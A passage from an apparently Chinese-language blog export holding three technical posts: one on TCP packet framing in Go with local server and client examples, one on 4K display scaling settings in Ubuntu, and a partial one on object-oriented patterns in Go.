<li>消息长度固定，提前确定包长度，读取的时候也安固定长度读取，适合定长消息包。</li>
<li>使用特殊的字符或字符串作为消息的边界，例如 HTTP 协议的 headers 以“\r\n”为字段的分隔符</li>
<li>自定义协议，将消息分为消息头和消息体，消息头中包含表示消息总长度</li>
</ol>
<h2 id="3-Golang实战"><a href="#3-Golang实战" class="headerlink" title="3.Golang实战"></a>3.Golang实战</h2><p>首先，来看一个存在粘包问题的例子：</p>
<h3 id="一、Server端："><a href="#一、Server端：" class="headerlink" title="一、Server端："></a>一、Server端：</h3><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">"log"</span></span><br><span class="line">    <span class="string">"net"</span></span><br><span class="line">    <span class="string">"strings"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    listen, err := net.Listen(<span class="string">"tcp"</span>, <span class="string">"127.0.0.1:8888"</span>)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="built_in">panic</span>(err)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">defer</span> listen.Close()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> &#123;</span><br><span class="line">        conn, err := listen.Accept()</span><br><span class="line">        <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">            <span class="built_in">panic</span>(err)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> &#123;</span><br><span class="line">            data := <span class="built_in">make</span>([]<span class="keyword">byte</span>, <span class="number">10</span>)</span><br><span class="line"></span><br><span class="line">            _, err := conn.Read(data)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">                log.Printf(<span class="string">"%s\n"</span>, err.Error())</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            receive := <span class="keyword">string</span>(data)</span><br><span class="line">            log.Printf(<span class="string">"receive msg: %s\n"</span>, receive)</span><br><span class="line"></span><br><span class="line">            send := []<span class="keyword">byte</span>(strings.ToUpper(receive))</span><br><span class="line">            _, err = conn.Write(send)</span><br><span class="line">            <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">                log.Printf(<span class="string">"send msg failed, error: %s\n"</span>, err.Error())</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            log.Printf(<span class="string">"send msg: %s\n"</span>, receive)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>简单说一下这段代码，有点socket编程的基础的话应该很容易理解，基本上都是Listen -&gt; Accept -&gt; Read这个套路。</p>
<blockquote>
<p>有些人一下子就看出来这个服务有点“问题”，它是同步阻塞的，也就意味着这个服务同一时间只能处理一个连接请求，其实解决这个问题也很简单，得益于Go协程的强大，我们只需要开启一个协程单独处理每一个连接就行了。不过这不是今天的主题，有兴趣的童鞋可以自行研究。</p>
</blockquote>
<h3 id="二、Client端："><a href="#二、Client端：" class="headerlink" title="二、Client端："></a>二、Client端：</h3><p>这个服务的功能特别简单，客户端输入什么我就返回什么，客户端的话，这里我使用telnet来演示：</p>
<figure class="highlight shell"><figcaption><span>script</span></figcaption><table><tr><td class="code"><pre><span class="line">jwang@jwang:~$ telnet 127.0.0.1 8888</span><br><span class="line">Trying 127.0.0.1...</span><br><span class="line">Connected to 127.0.0.1.</span><br><span class="line">Escape character is '^]'.</span><br><span class="line">111111</span><br><span class="line">111111</span><br><span class="line">123456</span><br><span class="line">123456</span><br></pre></td></tr></table></figure>
<blockquote>
<p>当你按回车键的时候telnet会在消息后面自动追加”\r\n“换行符并发送消息！</p>
</blockquote>
<p>从代码里面可以看到，在接受消息的时候我们每次读取10个字节的内容输出并返回，如果输入的消息小于等于8（减去换行符）个字符的时候没有问题，但是当我们在telnet里面输入大于10个字符的内容的时候，这些数据的时候会被强行拆开处理。</p>
<p>当然这里有人说了，可不可以一次读多点，然而读多少都会存在这个问题，而且TCP会有缓存区，不一定能够及时把消息发出去，像Nagle优化算法会将多次间隔较小、数据量小的数据，合并成一个大的数据块，然后进行封包，还是会存在问题。</p>
<p>如果我们把这个内容看作是一个业务消息，这个业务消息就被拆分放到下个消息里面处理，必然会产生问题，这就是“粘包”问题的由来。说到底，还是用的人的问题，没有确定好数据边界，如果简单粗暴的读取固定长度的内容，必然会出现问题。</p>
<h2 id="4-边界符解决粘包问题"><a href="#4-边界符解决粘包问题" class="headerlink" title="4.边界符解决粘包问题"></a>4.边界符解决粘包问题</h2><p>前面说过这个问题，我们可以通过定义一个边界符号解决粘包问题，比如说在上面的例子里面telnet会自动在每一条消息后面追加“\r\n”符号，我们恰好可以利用这点来区分消息。</p>
<ol>
<li>定义一个buffer来临时存放消息</li>
<li>从conn里面读取固定字节大小内容，判断当前内容里面有没有分隔符</li>
<li>如果没有找到分隔符，把当前内容追加到buffer里面，然后重复第2步</li>
<li>如果找到分隔符，把当前内容里面分隔符之前的内容追加到buffer后输出</li>
<li>然后重置buffer，把分隔符之后的内容追加到buff，重复第2步 </li>
</ol>
<p>不过Go里面提供了一个非常好用的buffer库，为我们节省了很多操作</p>
<p>我们可以使用bufio库里面的NewReader把conn包装一下，然后使用ReadSlice方法读取内容，该方法会一直读直到遇到分隔符，非常简单实用。</p>
<h3 id="一、Server端：-1"><a href="#一、Server端：-1" class="headerlink" title="一、Server端："></a>一、Server端：</h3><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">"bufio"</span></span><br><span class="line">    <span class="string">"fmt"</span></span><br><span class="line">    <span class="string">"net"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    listen, err := net.Listen(<span class="string">"tcp"</span>, <span class="string">"127.0.0.1:8888"</span>)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="built_in">panic</span>(err)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">defer</span> listen.Close()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> &#123;</span><br><span class="line">        conn, err := listen.Accept()</span><br><span class="line">        <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">            <span class="built_in">panic</span>(err)</span><br><span class="line">        &#125;</span><br><span class="line">        reader := bufio.NewReader(conn)</span><br><span class="line">        <span class="keyword">for</span> &#123;</span><br><span class="line">            slice, err := reader.ReadSlice(<span class="string">'\n'</span>)</span><br><span class="line">            <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            &#125;</span><br><span class="line">            fmt.Printf(<span class="string">"%s"</span>, slice)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="二、Client端：-1"><a href="#二、Client端：-1" class="headerlink" title="二、Client端："></a>二、Client端：</h3><p>Client这里可以直接使用telnet，也可以自己写一个，代码如下：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">"log"</span></span><br><span class="line">    <span class="string">"net"</span></span><br><span class="line">    <span class="string">"strconv"</span></span><br><span class="line">    <span class="string">"testing"</span></span><br><span class="line">    <span class="string">"time"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Test</span><span class="params">(t *testing.T)</span></span> &#123;</span><br><span class="line">    conn, err := net.Dial(<span class="string">"tcp"</span>, <span class="string">"127.0.0.1:8888"</span>)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        log.Println(<span class="string">"dial error:"</span>, err)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">defer</span> conn.Close()</span><br><span class="line">    i := <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> &#123;</span><br><span class="line">        <span class="keyword">var</span> err error</span><br><span class="line">        _, err = conn.Write([]<span class="keyword">byte</span>(strconv.Itoa(i) + <span class="string">" =&gt; 77777\n"</span>))</span><br><span class="line">        _, err = conn.Write([]<span class="keyword">byte</span>(strconv.Itoa(i) + <span class="string">" =&gt; 88888\n"</span>))</span><br><span class="line">        _, err = conn.Write([]<span class="keyword">byte</span>(strconv.Itoa(i) + <span class="string">" =&gt; 555555555555555555555555555555555555555555\n"</span>))</span><br><span class="line">        <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">            <span class="built_in">panic</span>(err)</span><br><span class="line">        &#125;</span><br><span class="line">        time.Sleep(time.Second * <span class="number">1</span>)</span><br><span class="line">        _, err = conn.Write([]<span class="keyword">byte</span>(strconv.Itoa(i) + <span class="string">" =&gt; 123456\n"</span>))</span><br><span class="line">        _, err = conn.Write([]<span class="keyword">byte</span>(strconv.Itoa(i) + <span class="string">" =&gt; 123456\n"</span>))</span><br><span class="line">        <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">            <span class="built_in">panic</span>(err)</span><br><span class="line">        &#125;</span><br><span class="line">        time.Sleep(time.Second * <span class="number">1</span>)</span><br><span class="line">        _, err = conn.Write([]<span class="keyword">byte</span>(strconv.Itoa(i) + <span class="string">" =&gt; 9999999\n"</span>))</span><br><span class="line">        _, err = conn.Write([]<span class="keyword">byte</span>(strconv.Itoa(i) + <span class="string">" =&gt; 0000000000000000000000000000000000000000000\n"</span>))</span><br><span class="line">        <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">            <span class="built_in">panic</span>(err)</span><br><span class="line">        &#125;</span><br><span class="line">        i++</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>如果要说缺点，这种方式主要存在2点，第一点是分隔符的选择问题，如果需要传输的消息包含分隔符，那就需要提前做转义处理。第二点就是性能问题，如果消息体特别大，每次查找分隔符的位置的话肯定会有一点消耗。</p>
<h2 id="5-在头部放入信息长度"><a href="#5-在头部放入信息长度" class="headerlink" title="5.在头部放入信息长度"></a>5.在头部放入信息长度</h2><p>目前应用最广泛的是在消息的头部添加数据包长度，接收方根据消息长度进行接收；在一条TCP连接上，数据的流式传输在接收缓冲区里是有序的，其主要的问题就是第一个包的包尾与第二个包的包头共存接收缓冲区，所以根据长度读取是十分合适的。</p>
<h3 id="一、Server端：-2"><a href="#一、Server端：-2" class="headerlink" title="一、Server端："></a>一、Server端：</h3><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">"bufio"</span></span><br><span class="line">    <span class="string">"bytes"</span></span><br><span class="line">    <span class="string">"encoding/binary"</span></span><br><span class="line">    <span class="string">"fmt"</span></span><br><span class="line">    <span class="string">"net"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    listen, err := net.Listen(<span class="string">"tcp"</span>, <span class="string">"127.0.0.1:8888"</span>)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="built_in">panic</span>(err)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">defer</span> listen.Close()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> &#123;</span><br><span class="line">        conn, err := listen.Accept()</span><br><span class="line">        <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">            <span class="built_in">panic</span>(err)</span><br><span class="line">        &#125;</span><br><span class="line">        reader := bufio.NewReader(conn)</span><br><span class="line">        <span class="keyword">for</span> &#123;</span><br><span class="line">            <span class="comment">//前4个字节表示数据长度</span></span><br><span class="line">            peek, err := reader.Peek(<span class="number">4</span>)</span><br><span class="line">            <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            &#125;</span><br><span class="line">            buffer := bytes.NewBuffer(peek)</span><br><span class="line">            <span class="comment">//读取数据长度</span></span><br><span class="line">            <span class="keyword">var</span> length <span class="keyword">int32</span></span><br><span class="line">            err = binary.Read(buffer, binary.BigEndian, &amp;length)</span><br><span class="line">            <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//Buffered 返回缓存中未读取的数据的长度,如果缓存区的数据小于总长度，则意味着数据不完整</span></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">int32</span>(reader.Buffered()) &lt; length+<span class="number">4</span> &#123;</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//从缓存区读取大小为数据长度的数据</span></span><br><span class="line">            data := <span class="built_in">make</span>([]<span class="keyword">byte</span>, length+<span class="number">4</span>)</span><br><span class="line">            _, err = reader.Read(data)</span><br><span class="line">            <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            &#125;</span><br><span class="line">            fmt.Printf(<span class="string">"receive data: %s\n"</span>, data[<span class="number">4</span>:])</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="二、Client端：-2"><a href="#二、Client端：-2" class="headerlink" title="二、Client端："></a>二、Client端：</h3><p>需要注意的是发送数据的编码，这里使用了Go的binary库，先写入4个字节的头，再写入消息主体，最后一起发送过去。</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">"bytes"</span></span><br><span class="line">    <span class="string">"encoding/binary"</span></span><br><span class="line">    <span class="string">"fmt"</span></span><br><span class="line">    <span class="string">"log"</span></span><br><span class="line">    <span class="string">"net"</span></span><br><span class="line">    <span class="string">"testing"</span></span><br><span class="line">    <span class="string">"time"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Test</span><span class="params">(t *testing.T)</span></span> &#123;</span><br><span class="line">    conn, err := net.Dial(<span class="string">"tcp"</span>, <span class="string">"127.0.0.1:8888"</span>)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        log.Println(<span class="string">"dial error:"</span>, err)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">defer</span> conn.Close()</span><br><span class="line">    <span class="keyword">for</span> &#123;</span><br><span class="line">        data, _ := Encode(<span class="string">"123456789"</span>)</span><br><span class="line">        _, err := conn.Write(data)</span><br><span class="line">        data, _ = Encode(<span class="string">"888888888"</span>)</span><br><span class="line">        _, err = conn.Write(data)</span><br><span class="line">        time.Sleep(time.Second * <span class="number">1</span>)</span><br><span class="line">        data, _ = Encode(<span class="string">"777777777"</span>)</span><br><span class="line">        _, err = conn.Write(data)</span><br><span class="line">        data, _ = Encode(<span class="string">"123456789"</span>)</span><br><span class="line">        _, err = conn.Write(data)</span><br><span class="line">        time.Sleep(time.Second * <span class="number">1</span>)</span><br><span class="line">        fmt.Println(err)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Encode</span><span class="params">(message <span class="keyword">string</span>)</span> <span class="params">([]<span class="keyword">byte</span>, error)</span></span> &#123;</span><br><span class="line">    <span class="comment">// 读取消息的长度</span></span><br><span class="line">    <span class="keyword">var</span> length = <span class="keyword">int32</span>(<span class="built_in">len</span>(message))</span><br><span class="line">    <span class="keyword">var</span> pkg = <span class="built_in">new</span>(bytes.Buffer)</span><br><span class="line">    <span class="comment">// 写入消息头</span></span><br><span class="line">    err := binary.Write(pkg, binary.BigEndian, length)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 写入消息实体</span></span><br><span class="line">    err = binary.Write(pkg, binary.BigEndian, []<span class="keyword">byte</span>(message))</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> pkg.Bytes(), <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="6-总结"><a href="#6-总结" class="headerlink" title="6.总结"></a>6.总结</h2><p>世界上本没有“粘包”，只不过是少数人没有正确处理TCP数据边界问题，成熟的应用层协议（http、ssh）都不会存在这个问题。但是如果你使用纯TCP自定义协议，那就需要自己处理好了。</p>
]]></content>
      <categories>
        <category>Golang</category>
      </categories>
      <tags>
        <tag>Golang</tag>
      </tags>
  </entry>
  <entry>
    <title>Ubuntu 4K显示器缩放设置</title>
    <url>/2019/linux/ubuntu-4k-scale.html</url>
    <content><![CDATA[<p><img src="https://wangbjun.site/images/old/16d0f0f03263cb7b.jpg" alt=""></p>
<p>开头一张图介绍一下我现在日常生活和开发使用的电脑配置：Ubuntu 16.04 + i7-8700k + 1060 + nvme ssd + 32G RAM + 4k显示器，这个配置倒不算很高端，但是开发用体验很高，系统的流畅程度非常高</p>
<a id="more"></a>

<p>电脑CPU和内存可以差点，ssd是必须有的，另外还有一个亮点是LG的4k显示器，这个体验非常棒，现在4k显示器非常便宜，我这个也就2k左右的价格。</p>
<p>今天的主题就是4k显示器，众所周知，Mac的显示效果之所以出众是由于其高超的屏幕分辨率，几年前Mac都已经用上了3k分辨率，而且大多数Windows笔记本还用着1080p，苹果的IMac早已经用上了5k显示器。</p>
<p>换句话说，买Mac买的就是显示屏，没有屏幕的硬件加持，什么操作系统优化都是扯淡！有了4k显示器，你发现装上Windows显示效果也不差，不过这块我需要说一下，同等硬件下，Linux和Mac的显示效果确实要比Windows好一点，对高分屏的支持好很多。</p>
<h2 id="版本"><a href="#版本" class="headerlink" title="版本"></a>版本</h2><p>我个人比较喜欢unity桌面，所以还是用Ubuntu 16.04，我曾经尝试过Ubuntu 18.04，但是感觉gnome桌面在流畅度和易用性方面和unity还是有不少差距，所以本篇文章可能支持适合unity桌面吧</p>
<h2 id="硬件"><a href="#硬件" class="headerlink" title="硬件"></a>硬件</h2><p>如果你要换4k显示屏，有一点需要注意，不少i7 CPU 内置集显理论上是带的动4k+60fps的，但是只支持dp接口，不支持hdmi，这一点可以在intel官网的cpu详细规格里面可以查阅。但是大部分主板都不会带dp接口，很少很少，只有极少部分高端主板会带，而现在大部分独显都会带dp口。</p>
<p>众所周知，NVIDIA的独显在Linux上面的驱动支持都不是太好，但是intel的集显支持非常好，如果你想要使用4k显示器，一个独显少不了，不过据我目前的使用体验来说，1060 表现还不错，建议大家开启高性能模式，如下图：<br><img src="https://wangbjun.site/images/old/16d0f203bbf9601b.jpg" alt=""></p>
<h2 id="缩放设置"><a href="#缩放设置" class="headerlink" title="缩放设置"></a>缩放设置</h2><p>这是重点，根据我经验，在4k+27英寸显示器的配置下，缩放设置很简单，不需要什么环境变量，直接在显示里面设置缩放就行，默认是1，设置一个1.75-2比较合适。<br><img src="https://wangbjun.site/images/old/16d0f23300cd21d1.jpg" alt=""><br>实际上，上面这个设置好，已经可以解决99%的缩放问题了，不需要什么环境变量，上一些应用的图给大家看看：</p>
<p><img src="https://wangbjun.site/images/old/16d0f26799e5bf08.jpg" alt=""></p>
<p><img src="https://wangbjun.site/images/old/16d0f27645283d4e.jpg" alt=""></p>
<p><img src="https://wangbjun.site/images/old/16d0f27f294742ce.jpg" alt=""></p>
<h2 id="deepin缩放"><a href="#deepin缩放" class="headerlink" title="deepin缩放"></a>deepin缩放</h2><p>有些软件不走上面的缩放设置，比如deepin qq或wechat，估计很多用Linux的都会使用移植的deepin应用，但是也有办法:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">WINEPREFIX&#x3D;~&#x2F;.deepinwine&#x2F;Deepin-WeChat deepin-wine winecfg</span><br></pre></td></tr></table></figure>
<p>在弹出的对话框里面找到graphics设置，设置一个比较合适的dpi，以我个人经验，150-170比较合适，如下图：<br><img src="https://wangbjun.site/images/old/16d0f2ba8e833515.jpg" alt=""></p>
<h2 id="网易云音乐"><a href="#网易云音乐" class="headerlink" title="网易云音乐"></a>网易云音乐</h2><p>网易云的软件在4k下面也是个刺头，暂时没有完美的方案，但是有一个可以凑合用，在网易的desktop文件Exec配置里面加入：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">--force-device-scale-factor&#x3D;1.75</span><br></pre></td></tr></table></figure>
<h2 id="搜狗输入法"><a href="#搜狗输入法" class="headerlink" title="搜狗输入法"></a>搜狗输入法</h2><p>搜狗输入法其实也是不支持4k自动缩放的，不过我们可以把皮肤的字体设置大一点，达到的效果是一样的：<br><img src="https://wangbjun.site/images/old/16d0f301af11cca2.jpg" alt=""></p>
<h2 id="QT系列软件"><a href="#QT系列软件" class="headerlink" title="QT系列软件"></a>QT系列软件</h2><p>Linux下面有很多基于QT开发的软件，它的缩放有可能是跟系统走的，但是也有可能不是，根据我的经验，QT需要设置一下2个环境变量：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">export QT_DEVICE_PIXEL_RATIO&#x3D;2</span><br><span class="line">export QT_AUTO_SCREEN_SCALE_FACTOR&#x3D;1</span><br></pre></td></tr></table></figure>
<p>为什么有2个呢？据说第一个是老版本会用到，但是这个缩放因子只支持整数倍，你不能写1.5，有点蛋疼！</p>
<p>有些软件设置之后可能会放的太大，这时候我建议针对不同的软件，可以在启动之前使用export设置环境变量，或者在其快捷方式里面设置一下都可以，特殊情况特殊处理，但是大部分设置为2的话还可以接受。</p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Ubuntu</tag>
      </tags>
  </entry>
  <entry>
    <title>Go面向对象写法</title>
    <url>/2019/coding/golang/golang-oop.html</url>
    <content><![CDATA[<p>Go并不是一个类似于Java、C++，或PHP这样内置面向对象语法的操作的语言，在Go里面名义上是没有类（class）这个概念的，但是这并不代表Go不能面向对象，毕竟面向对象只是一种设计思想！</p>
<p>为什么Go并不原生支持面向对象呢？这是一个问题</p>
<p>接下来，我会从面向对象的三大特性封装、继承、多态这个几个方面来讲讲Go是怎么实现的OOP的。</p>
<a id="more"></a>

<h3 id="1-封装"><a href="#1-封装" class="headerlink" title="1.封装"></a>1.封装</h3><p>闲话少说，在Go里面可以使用结构体模拟类:</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> Goods <span class="keyword">struct</span> &#123;</span><br><span class="line">    name  <span class="keyword">string</span></span><br><span class="line">    price <span class="keyword">int</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在Go里面有一个约定俗称的规则，变量名、结构体名、结构体属性成员名大写代表是公开权限，可以被其它包使用。类似于类的<strong>public</strong>属性。如果小写就类似于<strong>private</strong>属性。</p>
<p>类里面除了属性之外，一般会有自己的方法，在Go里面可以这样实现(这里我采用的是Go modules结构)：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> models</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">"fmt"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Goods <span class="keyword">struct</span> &#123;</span><br><span class="line">    Name  <span class="keyword">string</span></span><br><span class="line">    Price <span class="keyword">int</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(g *Goods)</span> <span class="title">GetName</span><span class="params">()</span> <span class="title">string</span></span> &#123;</span><br><span class="line">    <span class="keyword">return</span> g.Name</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(g *Goods)</span> <span class="title">SetName</span><span class="params">(name <span class="keyword">string</span>)</span></span> &#123;</span><br><span class="line">    g.Name = name</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(*Goods)</span> <span class="title">String</span><span class="params">()</span></span> &#123;</span><br><span class="line">    fmt.Println(<span class="string">"I am Goods"</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其实就是在函数名前加一个类型声明，如果你在方法里面不需要使用类本身，则可以省略参数标识。</p>
<p>如何使用这个“类呢”？</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">"demo/models"</span></span><br><span class="line">    <span class="string">"fmt"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    goods := models.Goods&#123;</span><br><span class="line">        <span class="string">"笔记本"</span>, <span class="number">100</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    fmt.Printf(<span class="string">"Goods name is %s\n"</span>, goods.GetName())</span><br><span class="line">    </span><br><span class="line">    goods.SetName(<span class="string">"小米笔记本"</span>)</span><br><span class="line">    </span><br><span class="line">    fmt.Printf(<span class="string">"Goods name is %s\n"</span>, goods.GetName())</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们可以采用字面量赋值的方式初始化对象，虽然结构体并没有构造函数这个东西，但是我们可以造个差不多的方式出来。</p>
<p>新增这个方法：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">NewGoods</span><span class="params">(name <span class="keyword">string</span>, price <span class="keyword">int</span>)</span> <span class="title">Goods</span></span> &#123;</span><br><span class="line">    g := Goods&#123;</span><br><span class="line">        Name:  name,</span><br><span class="line">        Price: price,</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> g</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>然后我们就可以这样使用：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> goods models.Goods</span><br><span class="line">goods = models.NewGoods(<span class="string">"笔记本"</span>, <span class="number">1000</span>)</span><br></pre></td></tr></table></figure>
<p>其实区别倒是不大，封装了一下，更加简洁，虽然达不到构造函数自动调用的效果。</p>
<h3 id="2-继承"><a href="#2-继承" class="headerlink" title="2.继承"></a>2.继承</h3><p>Go里面并没有extends这样的语法，但是结构体的成员可以是结构体，这实际上是使用组合实现了继承的效果。</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> models</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Apple <span class="keyword">struct</span> &#123;</span><br><span class="line">    Goods <span class="comment">//继承了Goods</span></span><br><span class="line">    Color <span class="keyword">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 构造函数</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">NewApple</span><span class="params">(name <span class="keyword">string</span>, price <span class="keyword">int</span>, color <span class="keyword">string</span>)</span> <span class="title">Apple</span></span> &#123;</span><br><span class="line">    apple := Apple&#123;</span><br><span class="line">        Goods&#123;name, price&#125;,</span><br><span class="line">        color,</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> apple</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>main.go:</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">"demo/models"</span></span><br><span class="line">    <span class="string">"fmt"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    apple := models.NewApple(<span class="string">"红富士苹果"</span>, <span class="number">200</span>, <span class="string">"red"</span>)</span><br><span class="line">    fmt.Printf(<span class="string">"Apple name is %s"</span>, apple.GetName())</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Apple可以使用Goods的方法和属性，使用组合的好处就是不存在多继承的限制，在很多面向对象的语言里面，只能单继承。</p>
<h3 id="3-多态"><a href="#3-多态" class="headerlink" title="3.多态"></a>3.多态</h3><p>虽然Go里面也没有implements这样的关键字，但是在Go里面可以使用interface来实现多态效果，而且Go里面的接口相当灵活。</p>
<p>定义接口：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> models</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Saleable <span class="keyword">interface</span> &#123;</span><br><span class="line">    Sell()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>实现接口(Apple)：</p>
